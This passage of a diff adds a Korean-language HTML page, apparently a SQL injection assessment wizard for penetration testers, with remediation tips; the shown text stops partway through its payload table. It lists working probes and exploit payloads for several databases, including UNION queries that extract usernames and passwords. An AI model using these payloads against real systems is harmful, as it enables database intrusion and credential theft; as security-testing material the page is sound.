@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLi Diagnosis Wizard</title>
+  <style>
+    *{box-sizing:border-box}
+    body{margin:0;background:#f7f8fa;color:#191f28;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans KR",sans-serif;font-size:14px}
+    a{color:inherit;text-decoration:none}
+    .wrap{max-width:1200px;margin:0 auto;padding:28px 20px 64px}
+    /* nav */
+    .topnav{display:flex;align-items:center;gap:8px;margin-bottom:24px;font-size:13px;color:#8b95a1}
+    .topnav a{color:#3182f6}.topnav span{color:#c9d1d9}
+    /* header */
+    .page-head{margin-bottom:24px}
+    .eyebrow{display:inline-flex;align-items:center;height:26px;padding:0 10px;border-radius:999px;background:#fff4e6;color:#e8590c;font-size:12px;font-weight:800;margin-bottom:10px}
+    .page-head h1{margin:0 0 6px;font-size:26px;font-weight:900}
+    .page-head p{margin:0;color:#4e5968;font-size:14px;line-height:1.6}
+    /* progress */
+    .progress{display:flex;gap:0;margin-bottom:28px;border:1px solid #e5e8eb;border-radius:8px;overflow:hidden;background:#fff}
+    .prog-step{flex:1;padding:12px 14px;display:flex;align-items:center;gap:10px;border-right:1px solid #e5e8eb;cursor:pointer;transition:.15s}
+    .prog-step:last-child{border-right:none}
+    .prog-step.active{background:#fff4e6}
+    .prog-step.done{background:#f8f9fa}
+    .prog-num{width:24px;height:24px;border-radius:50%;background:#e5e8eb;color:#8b95a1;font-size:12px;font-weight:800;display:grid;place-items:center;flex-shrink:0}
+    .prog-step.active .prog-num{background:#e8590c;color:#fff}
+    .prog-step.done .prog-num{background:#20c997;color:#fff}
+    .prog-label{font-size:13px;font-weight:700;color:#4e5968}
+    .prog-step.active .prog-label{color:#e8590c}
+    /* layout */
+    .wizard-layout{display:grid;grid-template-columns:1fr 300px;gap:16px;align-items:start}
+    @media(max-width:900px){.wizard-layout{grid-template-columns:1fr}}
+    /* panels */
+    .panel{background:#fff;border:1px solid #e5e8eb;border-radius:8px;padding:22px}
+    .panel-title{font-size:16px;font-weight:900;margin:0 0 16px;padding-bottom:12px;border-bottom:1px solid #f2f4f6}
+    /* sidebar */
+    .sidebar{display:flex;flex-direction:column;gap:12px}
+    .sidebar-box{background:#fff;border:1px solid #e5e8eb;border-radius:8px;padding:16px}
+    .sidebar-box h4{margin:0 0 10px;font-size:13px;font-weight:900;color:#4e5968;text-transform:uppercase;letter-spacing:.04em}
+    /* form elements */
+    .field{margin-bottom:16px}
+    .field label{display:block;font-size:13px;font-weight:700;margin-bottom:6px;color:#4e5968}
+    .field select,.field input[type=text]{width:100%;padding:8px 10px;border:1px solid #e5e8eb;border-radius:6px;font-size:13px;background:#fff;outline:none}
+    .field select:focus,.field input[type=text]:focus{border-color:#e8590c;box-shadow:0 0 0 2px rgba(232,89,12,.12)}
+    /* radio grid */
+    .radio-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+    .radio-card{border:2px solid #e5e8eb;border-radius:8px;padding:10px 12px;cursor:pointer;transition:.15s}
+    .radio-card:hover{border-color:#f08c4a}
+    .radio-card.selected{border-color:#e8590c;background:#fff4e6}
+    .radio-card input{display:none}
+    .rc-label{font-size:13px;font-weight:700;color:#191f28}
+    .rc-desc{font-size:12px;color:#8b95a1;margin-top:2px}
+    /* btn */
+    .btn{display:inline-flex;align-items:center;gap:6px;padding:9px 18px;border-radius:6px;font-size:13px;font-weight:800;cursor:pointer;border:none;transition:.15s}
+    .btn-primary{background:#e8590c;color:#fff}.btn-primary:hover{background:#d14b08}
+    .btn-ghost{background:#f2f4f6;color:#4e5968}.btn-ghost:hover{background:#e5e8eb}
+    .btn-sm{padding:5px 12px;font-size:12px}
+    .btn-row{display:flex;gap:8px;margin-top:20px}
+    /* probe table */
+    .probe-table{width:100%;border-collapse:collapse;font-size:13px}
+    .probe-table th{text-align:left;padding:8px 10px;background:#f8f9fa;font-weight:700;border-bottom:2px solid #e5e8eb;color:#4e5968}
+    .probe-table td{padding:8px 10px;border-bottom:1px solid #f2f4f6;vertical-align:middle}
+    .probe-table tr:last-child td{border-bottom:none}
+    .probe-code{font-family:monospace;font-size:12px;background:#f2f4f6;padding:3px 6px;border-radius:4px;cursor:pointer;user-select:all}
+    .probe-code:hover{background:#e5e8eb}
+    /* result buttons */
+    .result-btns{display:flex;gap:4px}
+    .rbtn{padding:3px 8px;border-radius:4px;font-size:11px;font-weight:700;cursor:pointer;border:1.5px solid transparent;transition:.12s}
+    .rbtn-error{border-color:#ffa8a8;color:#c92a2a;background:#fff5f5}.rbtn-error.active{background:#c92a2a;color:#fff;border-color:#c92a2a}
+    .rbtn-same{border-color:#a9e34b;color:#2f9e44;background:#f4fce3}.rbtn-same.active{background:#2f9e44;color:#fff;border-color:#2f9e44}
+    .rbtn-diff{border-color:#ffd43b;color:#e67700;background:#fff9db}.rbtn-diff.active{background:#e67700;color:#fff;border-color:#e67700}
+    .rbtn-delay{border-color:#a5d8ff;color:#1864ab;background:#e7f5ff}.rbtn-delay.active{background:#1864ab;color:#fff;border-color:#1864ab}
+    /* vuln type cards */
+    .vuln-cards{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+    .vuln-card{border:2px solid #e5e8eb;border-radius:8px;padding:12px;cursor:pointer;transition:.15s}
+    .vuln-card:hover{border-color:#f08c4a}
+    .vuln-card.selected{border-color:#e8590c;background:#fff4e6}
+    .vuln-card h4{margin:0 0 4px;font-size:14px;font-weight:800}
+    .vuln-card p{margin:0;font-size:12px;color:#8b95a1;line-height:1.4}
+    .vuln-card .badge{display:inline-block;padding:2px 7px;border-radius:999px;font-size:11px;font-weight:700;margin-top:6px}
+    .badge-error{background:#ffe3e3;color:#c92a2a}
+    .badge-union{background:#d3f9d8;color:#2f9e44}
+    .badge-bool{background:#fff9db;color:#e67700}
+    .badge-time{background:#e7f5ff;color:#1864ab}
+    .badge-oob{background:#f3d9fa;color:#862e9c}
+    /* payload section */
+    .pl-section{margin-bottom:20px}
+    .pl-section-title{font-size:14px;font-weight:900;color:#4e5968;margin:0 0 10px;padding-left:10px;border-left:3px solid #e8590c}
+    .pl-item{background:#f8f9fa;border:1px solid #e5e8eb;border-radius:6px;padding:10px 12px;margin-bottom:8px;display:flex;flex-direction:column;gap:6px}
+    .pl-item.success{border-color:#20c997;background:#f0fff8}
+    .pl-item.blocked{border-color:#ffa8a8;background:#fff5f5;opacity:.7}
+    .pl-label{font-size:12px;font-weight:700;color:#8b95a1;display:flex;align-items:center;gap:6px}
+    .pl-code{font-family:monospace;font-size:12px;background:#191f28;color:#a9e34b;padding:8px 10px;border-radius:4px;white-space:pre-wrap;word-break:break-all}
+    .pl-actions{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+    .tier{display:inline-block;padding:2px 7px;border-radius:999px;font-size:11px;font-weight:800}
+    .tier-1{background:#fff4e6;color:#e8590c}
+    .tier-2{background:#f8f9fa;color:#4e5968}
+    .tier-3{background:#f3d9fa;color:#862e9c}
+    /* dbms tabs */
+    .dbms-tabs{display:flex;gap:4px;margin-bottom:14px;flex-wrap:wrap}
+    .dbms-tab{padding:5px 14px;border-radius:999px;font-size:12px;font-weight:800;cursor:pointer;background:#f2f4f6;color:#4e5968;border:none;transition:.15s}
+    .dbms-tab.active{background:#e8590c;color:#fff}
+    /* hint box */
+    .hint-box{background:#fff4e6;border:1px solid #ffc078;border-radius:6px;padding:10px 12px;font-size:13px;margin-top:12px;color:#7c3a09;line-height:1.55}
+    .hint-box strong{color:#e8590c}
+    /* findings list */
+    .finding-item{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid #f2f4f6;font-size:12px}
+    .finding-item:last-child{border-bottom:none}
+    .finding-key{color:#8b95a1;font-weight:700}
+    .finding-val{font-weight:800;color:#191f28}
+    /* info callout */
+    .callout{background:#fff4e6;border-left:3px solid #e8590c;padding:10px 14px;border-radius:0 6px 6px 0;font-size:13px;line-height:1.55;color:#5c2a08;margin-bottom:16px}
+    .callout strong{color:#e8590c}
+    /* copy toast */
+    #copy-toast{position:fixed;bottom:24px;right:24px;background:#191f28;color:#fff;padding:8px 16px;border-radius:6px;font-size:13px;font-weight:700;opacity:0;transition:opacity .25s;pointer-events:none;z-index:999}
+    /* success msg */
+    .success-banner{display:none;background:#f0fff8;border:1px solid #20c997;border-radius:6px;padding:10px 14px;font-size:13px;font-weight:700;color:#0d6657;margin-top:12px}
+    /* hidden */
+    .hidden{display:none!important}
+  </style>
+</head>
+<body>
+<div id="copy-toast">클립보드에 복사됨</div>
+<div class="wrap">
+  <nav class="topnav">
+    <a href="index.html">홈</a><span>/</span>
+    <a href="vuln.html">취약점 진단</a><span>/</span>
+    <span>SQL Injection</span>
+  </nav>
+
+  <div class="page-head">
+    <span class="eyebrow">SQLi Wizard</span>
+    <h1>SQL Injection 진단 마법사</h1>
+    <p>아키텍처 파악 → 프로브 삽입 → 취약점 분류 → 익스플로잇 페이로드 생성까지 단계별로 안내합니다.</p>
+  </div>
+
+  <div class="progress" id="progress">
+    <div class="prog-step active" onclick="jumpStep(1)">
+      <div class="prog-num" id="pn1">1</div>
+      <div class="prog-label">아키텍처 파악</div>
+    </div>
+    <div class="prog-step" onclick="jumpStep(2)">
+      <div class="prog-num" id="pn2">2</div>
+      <div class="prog-label">프로브 삽입</div>
+    </div>
+    <div class="prog-step" onclick="jumpStep(3)">
+      <div class="prog-num" id="pn3">3</div>
+      <div class="prog-label">취약점 분류</div>
+    </div>
+    <div class="prog-step" onclick="jumpStep(4)">
+      <div class="prog-num" id="pn4">4</div>
+      <div class="prog-label">익스플로잇</div>
+    </div>
+  </div>
+
+  <div class="wizard-layout">
+    <!-- Main Steps -->
+    <div id="main-content">
+
+      <!-- STEP 1 -->
+      <div id="step1" class="panel">
+        <div class="panel-title">Step 1 — 아키텍처 파악</div>
+        <div class="callout">
+          <strong>SQLi 발생 원인:</strong> 사용자 입력이 SQL 쿼리에 그대로 연결(concatenation)될 때 발생합니다.
+          입력 파라미터의 타입과 위치를 먼저 파악하면 초기 프로브 선택이 쉬워집니다.
+        </div>
+
+        <div class="field">
+          <label>파라미터 타입 (Parameter Context)</label>
+          <div class="radio-grid">
+            <label class="radio-card" id="rc-numeric" onclick="pickArch('paramType','numeric',this)">
+              <input type="radio" name="paramType" value="numeric">
+              <div class="rc-label">숫자형 (Numeric)</div>
+              <div class="rc-desc">id=1, page=2 등 따옴표 없이 삽입</div>
+            </label>
+            <label class="radio-card" id="rc-string" onclick="pickArch('paramType','string',this)">
+              <input type="radio" name="paramType" value="string">
+              <div class="rc-label">문자형 (String)</div>
+              <div class="rc-desc">name='value' 형식, 따옴표로 감쌈</div>
+            </label>
+            <label class="radio-card" id="rc-json" onclick="pickArch('paramType','json',this)">
+              <input type="radio" name="paramType" value="json">
+              <div class="rc-label">JSON Body</div>
+              <div class="rc-desc">{"key":"value"} 형식 POST</div>
+            </label>
+            <label class="radio-card" id="rc-xml" onclick="pickArch('paramType','xml',this)">
+              <input type="radio" name="paramType" value="xml">
+              <div class="rc-label">XML / SOAP</div>
+              <div class="rc-desc">&lt;value&gt; 노드 내 삽입</div>
+            </label>
+          </div>
+        </div>
+
+        <div class="field">
+          <label>입력 위치 (Input Source)</label>
+          <div class="radio-grid">
+            <label class="radio-card" id="rc-get" onclick="pickArch('inputSrc','get',this)">
+              <input type="radio" name="inputSrc" value="get">
+              <div class="rc-label">GET 파라미터</div>
+              <div class="rc-desc">URL 쿼리스트링 ?id=</div>
+            </label>
+            <label class="radio-card" id="rc-post" onclick="pickArch('inputSrc','post',this)">
+              <input type="radio" name="inputSrc" value="post">
+              <div class="rc-label">POST Body</div>
+              <div class="rc-desc">폼 또는 JSON body</div>
+            </label>
+            <label class="radio-card" id="rc-cookie" onclick="pickArch('inputSrc','cookie',this)">
+              <input type="radio" name="inputSrc" value="cookie">
+              <div class="rc-label">Cookie</div>
+              <div class="rc-desc">Cookie 헤더 값</div>
+            </label>
+            <label class="radio-card" id="rc-header" onclick="pickArch('inputSrc','header',this)">
+              <input type="radio" name="inputSrc" value="header">
+              <div class="rc-label">HTTP 헤더</div>
+              <div class="rc-desc">User-Agent, Referer 등</div>
+            </label>
+          </div>
+        </div>
+
+        <div class="field">
+          <label>DBMS 힌트 <span style="font-weight:400;color:#8b95a1">(선택, 모르면 비워두세요)</span></label>
+          <select id="dbmsHint" onchange="S.arch.dbms=this.value">
+            <option value="">모름 / 미확인</option>
+            <option value="mysql">MySQL / MariaDB</option>
+            <option value="mssql">MSSQL (SQL Server)</option>
+            <option value="oracle">Oracle</option>
+            <option value="postgres">PostgreSQL</option>
+            <option value="sqlite">SQLite</option>
+          </select>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" onclick="goStep(2)">다음: 프로브 삽입 →</button>
+        </div>
+      </div>
+
+      <!-- STEP 2 -->
+      <div id="step2" class="panel hidden">
+        <div class="panel-title">Step 2 — 프로브 삽입 (Injection Probe)</div>
+        <div class="callout">
+          <strong>Burp Suite 연계:</strong> 각 프로브를 Repeater에서 순서대로 전송하고 HTTP 응답 코드·바디 변화를 비교하세요.
+          응답 결과 버튼을 클릭해 기록하면 Step 3에서 취약점 유형이 자동 추론됩니다.
+        </div>
+
+        <div id="probe-table-wrap"></div>
+
+        <div class="hint-box hidden" id="probe-hint"></div>
+
+        <div class="btn-row">
+          <button class="btn btn-ghost" onclick="goStep(1)">← 이전</button>
+          <button class="btn btn-primary" onclick="goStep(3)">다음: 취약점 분류 →</button>
+        </div>
+      </div>
+
+      <!-- STEP 3 -->
+      <div id="step3" class="panel hidden">
+        <div class="panel-title">Step 3 — 취약점 분류</div>
+        <div class="callout" id="vuln-infer-hint">
+          프로브 결과를 바탕으로 추론된 취약점 유형이 표시됩니다. 직접 선택하거나 수정할 수 있습니다.
+        </div>
+
+        <div class="vuln-cards" id="vuln-cards-wrap">
+          <div class="vuln-card" id="vc-error" onclick="pickVuln('error',this)">
+            <h4>Error-based</h4>
+            <p>에러 메시지에 DB 정보가 노출됨. 직접 데이터 추출 가능.</p>
+            <span class="badge badge-error">에러 응답</span>
+          </div>
+          <div class="vuln-card" id="vc-union" onclick="pickVuln('union',this)">
+            <h4>UNION-based</h4>
+            <p>SELECT 결과가 응답에 반영. UNION으로 데이터 직접 추출.</p>
+            <span class="badge badge-union">응답에 데이터 반영</span>
+          </div>
+          <div class="vuln-card" id="vc-boolean" onclick="pickVuln('boolean',this)">
+            <h4>Boolean Blind</h4>
+            <p>참/거짓에 따라 응답 차이 발생. 비트 단위 데이터 추출.</p>
+            <span class="badge badge-bool">응답 내용 차이</span>
+          </div>
+          <div class="vuln-card" id="vc-time" onclick="pickVuln('time',this)">
+            <h4>Time-based Blind</h4>
+            <p>응답 지연으로 참/거짓 판별. 응답이 없을 때 사용.</p>
+            <span class="badge badge-time">응답 지연</span>
+          </div>
+          <div class="vuln-card" id="vc-oob" onclick="pickVuln('oob',this)">
+            <h4>OOB (Out-of-Band)</h4>
+            <p>DNS/HTTP 채널로 데이터 전송. xp_dirtree + Collaborator.</p>
+            <span class="badge badge-oob">외부 채널</span>
+          </div>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-ghost" onclick="goStep(2)">← 이전</button>
+          <button class="btn btn-primary" onclick="goStep(4)">다음: 페이로드 생성 →</button>
+        </div>
+      </div>
+
+      <!-- STEP 4 -->
+      <div id="step4" class="panel hidden">
+        <div class="panel-title">Step 4 — 익스플로잇 페이로드</div>
+
+        <div class="dbms-tabs" id="dbms-tabs"></div>
+
+        <div id="payload-area"></div>
+
+        <div class="success-banner" id="success-banner">
+          페이로드 성공! 취약점 확인됨. 보고서 작성 후 즉시 담당자에게 공유하세요.
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-ghost" onclick="goStep(3)">← 이전</button>
+          <button class="btn btn-ghost" onclick="resetAll()">처음부터 다시</button>
+        </div>
+      </div>
+
+    </div><!-- /main-content -->
+
+    <!-- Sidebar -->
+    <div class="sidebar" id="sidebar">
+      <div class="sidebar-box">
+        <h4>진단 현황</h4>
+        <div id="findings-list">
+          <div class="finding-item">
+            <span class="finding-key">파라미터</span>
+            <span class="finding-val" id="f-param">—</span>
+          </div>
+          <div class="finding-item">
+            <span class="finding-key">입력 위치</span>
+            <span class="finding-val" id="f-src">—</span>
+          </div>
+          <div class="finding-item">
+            <span class="finding-key">DBMS</span>
+            <span class="finding-val" id="f-dbms">미확인</span>
+          </div>
+          <div class="finding-item">
+            <span class="finding-key">취약점 유형</span>
+            <span class="finding-val" id="f-vuln">—</span>
+          </div>
+          <div class="finding-item">
+            <span class="finding-key">프로브 결과</span>
+            <span class="finding-val" id="f-probes">—</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="sidebar-box">
+        <h4>Causality Flow</h4>
+        <div style="font-size:12px;color:#4e5968;line-height:1.8">
+          <div>① 사용자 입력 수집</div>
+          <div style="color:#c9d1d9">↓</div>
+          <div>② 입력값 SQL 쿼리 연결</div>
+          <div style="color:#c9d1d9">↓</div>
+          <div style="color:#e8590c;font-weight:700">③ SQL 구조 변형 발생</div>
+          <div style="color:#c9d1d9">↓</div>
+          <div>④ DB 비정상 쿼리 실행</div>
+          <div style="color:#c9d1d9">↓</div>
+          <div>⑤ 데이터 노출 / 조작</div>
+        </div>
+      </div>
+
+      <div class="sidebar-box">
+        <h4>조치 방향</h4>
+        <div style="font-size:12px;color:#4e5968;line-height:1.7">
+          <div style="margin-bottom:6px"><strong style="color:#2f9e44">✓ PreparedStatement</strong><br>파라미터 바인딩으로 구조 분리</div>
+          <div style="margin-bottom:6px"><strong style="color:#2f9e44">✓ ORM #{} 바인딩</strong><br>MyBatis #{} / JPA 파라미터 사용<br><span style="color:#c92a2a">${} 직접 삽입 금지</span></div>
+          <div><strong style="color:#2f9e44">✓ 입력값 화이트리스트</strong><br>정수형 파라미터는 형변환 검증</div>
+        </div>
+      </div>
+
+      <div class="sidebar-box">
+        <h4>참고 자료</h4>
+        <div style="font-size:12px;line-height:1.8">
+          <div><a href="https://portswigger.net/web-security/sql-injection" target="_blank" style="color:#3182f6">PortSwigger SQLi Guide</a></div>
+          <div><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" style="color:#3182f6">SQLi Cheat Sheet</a></div>
+          <div><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" style="color:#3182f6">PayloadsAllTheThings</a></div>
+        </div>
+      </div>
+    </div><!-- /sidebar -->
+  </div>
+</div>
+
+<script>
+const S = {
+  step: 1,
+  arch: { paramType: null, inputSrc: null, dbms: '' },
+  probes: {},   // probeId -> result: 'error'|'same'|'diff'|'delay'|null
+  vuln: null,
+  dbmsActive: 'generic',
+  plStats: { tried: 0, success: 0 }
+};
+
+/* ── Probe definitions ─────────────────────────────────── */
+function getProbes() {
+  const isNum = S.arch.paramType === 'numeric';
+  const prefix = isNum ? '' : "'";
+  const probes = [
+    { id: 'p1', label: "싱글 쿼트 삽입", payload: isNum ? "1'" : "test'",
+      desc: "구문 오류 유발 — 에러 응답 시 취약", expect: '에러' },
+    { id: 'p2', label: "항상 참 조건", payload: isNum ? "1 AND 1=1" : "test' AND '1'='1",
+      desc: "정상 응답과 동일해야 함", expect: '동일' },
+    { id: 'p3', label: "항상 거짓 조건", payload: isNum ? "1 AND 1=2" : "test' AND '1'='2",
+      desc: "결과 없거나 다른 응답이면 Boolean Blind", expect: '다름' },
+    { id: 'p4', label: "시간 지연 (MySQL)", payload: isNum ? "1 AND SLEEP(5)" : "test' AND SLEEP(5)--",
+      desc: "5초 이상 지연 시 Time Blind", expect: '지연' },
+    { id: 'p5', label: "시간 지연 (MSSQL)", payload: isNum ? "1; WAITFOR DELAY '0:0:5'--" : "test'; WAITFOR DELAY '0:0:5'--",
+      desc: "MSSQL 환경 Time Blind 확인", expect: '지연' },
+    { id: 'p6', label: "주석 처리 (--)", payload: isNum ? "1--" : "test'--",
+      desc: "뒷부분 쿼리 무효화 — 동일 응답이면 주석 작동", expect: '동일' },
+    { id: 'p7', label: "UNION 컬럼 탐색", payload: isNum ? "1 ORDER BY 1--" : "test' ORDER BY 1--",
+      desc: "숫자를 늘려가며 에러 발생 직전 컬럼 수 확인", expect: '동일' },
+  ];
+  return probes;
+}
+
+/* ── Architecture ──────────────────────────────────────── */
+function pickArch(field, val, el) {
+  S.arch[field] = val;
+  const name = field === 'paramType' ? 'paramType' : 'inputSrc';
+  document.querySelectorAll(`[id^="rc-"]`).forEach(e => {
+    if (e.querySelector(`input[name="${name}"]`)) e.classList.remove('selected');
+  });
+  el.classList.add('selected');
+  updateFindings();
+}
+
+/* ── Step navigation ───────────────────────────────────── */
+function jumpStep(n) {
+  if (n > S.step) return;
+  goStepDirect(n);
+}
+
+function goStep(n) {
+  if (n === 2 && !validate1()) return;
+  if (n === 4 && !S.vuln) { alert('취약점 유형을 선택해주세요.'); return; }
+  if (n > 4 || n < 1) return;
+  goStepDirect(n);
+}
+
+function goStepDirect(n) {
+  const prev = S.step;
+  S.step = n;
+
+  document.querySelectorAll('[id^="step"]').forEach(e => e.classList.add('hidden'));
+  document.getElementById('step' + n).classList.remove('hidden');
+
+  // update progress bar
+  for (let i = 1; i <= 4; i++) {
+    const el = document.querySelector(`#progress .prog-step:nth-child(${i})`);
+    const pn = document.getElementById('pn' + i);
+    el.classList.remove('active', 'done');
+    if (i < n) { el.classList.add('done'); pn.textContent = '✓'; }
+    else if (i === n) { el.classList.add('active'); pn.textContent = i; }
+    else { pn.textContent = i; }
+  }
+
+  if (n === 2) renderProbeTable();
+  if (n === 3) inferVuln();
+  if (n === 4) renderPayloads();
+  updateFindings();
+}
+
+function validate1() {
+  if (!S.arch.paramType) { alert('파라미터 타입을 선택해주세요.'); return false; }
+  if (!S.arch.inputSrc) { alert('입력 위치를 선택해주세요.'); return false; }
+  return true;
+}
+
+/* ── Probe table render ────────────────────────────────── */
+function renderProbeTable() {
+  const probes = getProbes();
+  let html = `<table class="probe-table">
+    <thead><tr>
+      <th style="width:22%">프로브</th>
+      <th style="width:38%">삽입 값 (클릭 복사)</th>
+      <th style="width:24%">결과 기록</th>
+      <th>기대</th>
+    </tr></thead><tbody>`;
+  for (const p of probes) {
+    if (!S.probes[p.id]) S.probes[p.id] = null;
+    const cur = S.probes[p.id];
+    html += `<tr>
+      <td><strong>${esc(p.label)}</strong><br><span style="color:#8b95a1;font-size:11px">${esc(p.desc)}</span></td>
+      <td><span class="probe-code" onclick="copyText(${JSON.stringify(p.payload)},this)">${esc(p.payload)}</span></td>
+      <td><div class="result-btns">
+        <button class="rbtn rbtn-error${cur==='error'?' active':''}" onclick="setProbe('${p.id}','error',this)">에러</button>
+        <button class="rbtn rbtn-same${cur==='same'?' active':''}" onclick="setProbe('${p.id}','same',this)">동일</button>
+        <button class="rbtn rbtn-diff${cur==='diff'?' active':''}" onclick="setProbe('${p.id}','diff',this)">다름</button>
+        <button class="rbtn rbtn-delay${cur==='delay'?' active':''}" onclick="setProbe('${p.id}','delay',this)">지연</button>
+      </div></td>
+      <td><span style="font-size:11px;color:#8b95a1">${esc(p.expect)}</span></td>
+    </tr>`;
+  }
+  html += '</tbody></table>';
+  document.getElementById('probe-table-wrap').innerHTML = html;
+  updateProbeHint();
+}
+
+function setProbe(id, result, btn) {
+  S.probes[id] = result;
+  const row = btn.closest('tr');
+  row.querySelectorAll('.rbtn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  updateProbeHint();
+  updateFindings();
+}
+
+function updateProbeHint() {
+  const hint = document.getElementById('probe-hint');
+  const results = Object.values(S.probes).filter(Boolean);
+  if (!results.length) { hint.classList.add('hidden'); return; }
+
+  const has = r => Object.values(S.probes).includes(r);
+  let msg = '';
+  if (has('error')) msg = '<strong>에러 응답 감지</strong> — Error-based 또는 UNION-based SQLi 가능성이 높습니다.';
+  else if (has('diff') && has('same')) msg = '<strong>참/거짓 응답 차이 감지</strong> — Boolean Blind SQLi 가능성이 높습니다.';
+  else if (has('delay')) msg = '<strong>시간 지연 감지</strong> — Time-based Blind SQLi 가능성이 높습니다.';
+  else msg = '더 많은 프로브를 시도하거나 취약점 분류 단계에서 직접 선택하세요.';
+
+  hint.innerHTML = msg;
+  hint.classList.remove('hidden');
+}
+
+/* ── Vuln inference ────────────────────────────────────── */
+function inferVuln() {
+  const has = r => Object.values(S.probes).includes(r);
+  let inferred = null;
+  if (has('error')) inferred = 'error';
+  else if (has('diff') && has('same')) inferred = 'boolean';
+  else if (has('delay')) inferred = 'time';
+
+  const hint = document.getElementById('vuln-infer-hint');
+  if (inferred) {
+    pickVuln(inferred, document.getElementById('vc-' + inferred));
+    const names = { error:'Error-based', union:'UNION-based', boolean:'Boolean Blind', time:'Time-based Blind', oob:'OOB' };
+    hint.innerHTML = `프로브 결과를 기반으로 <strong>${names[inferred]}</strong>이(가) 추론되었습니다. 필요 시 직접 변경하세요.`;
+  } else {
+    hint.innerHTML = '프로브 결과가 부족합니다. 아래에서 직접 유형을 선택하세요.';
+  }
+}
+
+function pickVuln(type, el) {
+  S.vuln = type;
+  document.querySelectorAll('.vuln-card').forEach(c => c.classList.remove('selected'));
+  if (el) el.classList.add('selected');
+  updateFindings();
+}
+
+/* ── Payload render ────────────────────────────────────── */
+const DBMS_LIST = [
+  { id: 'generic', label: '공통' },
+  { id: 'mysql',   label: 'MySQL' },
+  { id: 'mssql',   label: 'MSSQL' },
+  { id: 'oracle',  label: 'Oracle' },
+  { id: 'postgres',label: 'PostgreSQL' },
+];
+
+const PAYLOADS = {
+  error: {
+    generic: [
+      { tier:1, label:'구문 오류 유발', code:"'" },
+      { tier:1, label:'AND 에러 유발', code:"' AND 1=CONVERT(int,(SELECT @@version))--" },
+    ],
+    mysql: [
+      { tier:1, label:'extractvalue 에러', code:"' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--" },
+      { tier:1, label:'updatexml 에러', code:"' AND updatexml(1,concat(0x7e,(SELECT database())),1)--" },
+      { tier:2, label:'FLOOR 에러', code:"' AND (SELECT 1 FROM(SELECT COUNT(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--" },
+    ],
+    mssql: [
+      { tier:1, label:'convert 에러', code:"' AND 1=CONVERT(int,(SELECT @@version))--" },
+      { tier:1, label:'데이터베이스명', code:"' AND 1=CONVERT(int,(SELECT DB_NAME()))--" },
+    ],
+    oracle: [
+      { tier:1, label:'ctxsys.drithsx 에러', code:"' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))--" },
+      { tier:2, label:'XMLTYPE 에러', code:"' AND 1=2 UNION SELECT XMLTYPE((SELECT banner FROM v$version WHERE rownum=1)) FROM dual--" },
+    ],
+    postgres: [
+      { tier:1, label:'cast 에러', code:"' AND 1=CAST((SELECT version()) AS int)--" },
+    ],
+  },
+  union: {
+    generic: [
+      { tier:1, label:'컬럼 수 확인 (ORDER BY)', code:"' ORDER BY 1--", note:'에러 발생 직전 숫자가 컬럼 수' },
+      { tier:1, label:'NULL 프로브 (2컬럼)', code:"' UNION SELECT NULL,NULL--" },
+      { tier:1, label:'NULL 프로브 (3컬럼)', code:"' UNION SELECT NULL,NULL,NULL--" },
+      { tier:2, label:'문자열 컬럼 탐색', code:"' UNION SELECT 'a',NULL--" },
+    ],
+    mysql: [
+      { tier:1, label:'버전 추출', code:"' UNION SELECT @@version,NULL--" },
+      { tier:1, label:'DB명 추출', code:"' UNION SELECT database(),NULL--" },
+      { tier:1, label:'테이블 목록', code:"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--" },
+      { tier:1, label:'컬럼 목록', code:"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--" },
+      { tier:1, label:'크레덴셜 추출', code:"' UNION SELECT CONCAT(username,':',password),NULL FROM users--" },
+    ],
+    mssql: [
+      { tier:1, label:'버전 추출', code:"' UNION SELECT @@version,NULL--" },
+      { tier:1, label:'DB명 추출', code:"' UNION SELECT DB_NAME(),NULL--" },
+      { tier:1, label:'테이블 목록', code:"' UNION SELECT table_name,NULL FROM information_schema.tables--" },
+      { tier:1, label:'크레덴셜 추출', code:"' UNION SELECT username+':'+password,NULL FROM users--" },
+    ],
+    oracle: [
+      { tier:1, label:'버전 추출', code:"' UNION SELECT banner,NULL FROM v$version--" },
+      { tier:1, label:'테이블 목록', code:"' UNION SELECT table_name,NULL FROM all_tables--" },
+      { tier:1, label:'크레덴셜 추출', code:"' UNION SELECT username||':'||password,NULL FROM users--" },
+    ],
+    postgres: [
+      { tier:1, label:'버전 추출', code:"' UNION SELECT version(),NULL--" },
+      { tier:1, label:'테이블 목록', code:"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--" },
+      { tier:1, label:'크레덴셜 추출', code:"' UNION SELECT username||':'||password,NULL FROM users--" },
+    ],
+  },
+  boolean: {
+    generic: [
+      { tier:1, label:'참 조건 기준', code:"' AND 1=1--" },
+      { tier:1, label:'거짓 조건 비교', code:"' AND 1=2--" },
+      { tier:1, label:'문자열 비교 (참)', code:"' AND 'a'='a'--" },
+    ],
+    mysql: [
+      { tier:1, label:'DB명 첫 글자 추출', code:"' AND SUBSTRING(database(),1,1)='a'--", note:'a를 a-z로 변경하며 반복' },
+      { tier:1, label:'테이블 존재 확인', code:"' AND (SELECT COUNT(*) FROM users)>0--" },
+      { tier:2, label:'비트 단위 추출', code:"' AND ASCII(SUBSTRING(database(),1,1))>97--" },
+    ],
+    mssql: [
